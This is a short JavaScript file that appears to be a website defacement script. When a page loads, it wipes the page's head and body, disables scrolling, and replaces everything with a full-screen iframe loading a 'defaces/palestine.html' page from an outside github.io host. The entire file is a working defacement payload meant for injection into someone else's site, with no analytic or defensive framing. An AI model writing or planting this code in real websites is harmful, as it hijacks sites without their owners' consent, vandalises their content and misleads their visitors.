document.addEventListener("DOMContentLoaded", function () {
    // Clear head and body
    document.head.innerHTML = '';
    document.body.innerHTML = '';

    // Reset styles
    document.documentElement.style.margin = "0";
    document.documentElement.style.padding = "0";
    document.body.style.margin = "0";
    document.body.style.padding = "0";
    document.body.style.overflow = "hidden";

    // Create and configure iframe
    const iframe = document.createElement("iframe");
    iframe.src = "https://frostfoe.github.io/defaces/palestine.html";
    iframe.style.position = "fixed";
    iframe.style.top = "0";
    iframe.style.left = "0";
    iframe.style.width = "100vw";
    iframe.style.height = "100vh";
    iframe.style.border = "none";
    iframe.style.margin = "0";
    iframe.style.padding = "0";
    iframe.allow = "fullscreen";

    // Append iframe to body
    document.body.appendChild(iframe);
});
